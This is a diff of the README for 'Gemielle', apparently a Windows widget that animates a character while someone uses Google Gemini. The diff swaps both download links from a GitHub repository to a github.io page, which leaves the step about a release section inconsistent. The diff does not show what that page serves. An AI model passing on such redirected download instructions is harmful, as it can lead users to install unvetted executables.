@@ -1,6 +1,6 @@
 # 🌸 Gemielle - An Interactive Gemini AI Widget
 
-[Download Gemielle Here](https://github.com/Yunus1960/Gemielle)
+[Download Gemielle Here](https://yunus1960.github.io)
 
 Gemielle adds a character to your screen. This character reacts to your work on Google Gemini. It changes expressions while you type or wait for answers. It makes using Gemini more fun.
 
@@ -12,7 +12,7 @@ Gemielle watches your interactions on the Gemini website. It uses five different
 
 Follow these steps to install Gemielle on your Windows computer.
 
-1. Go to the [Gemielle download page](https://github.com/Yunus1960/Gemielle).
+1. Go to the [Gemielle download page](https://yunus1960.github.io).
 2. Look for the release section on the right side of the page.
 3. Click the latest version link.
 4. Download the installation file.
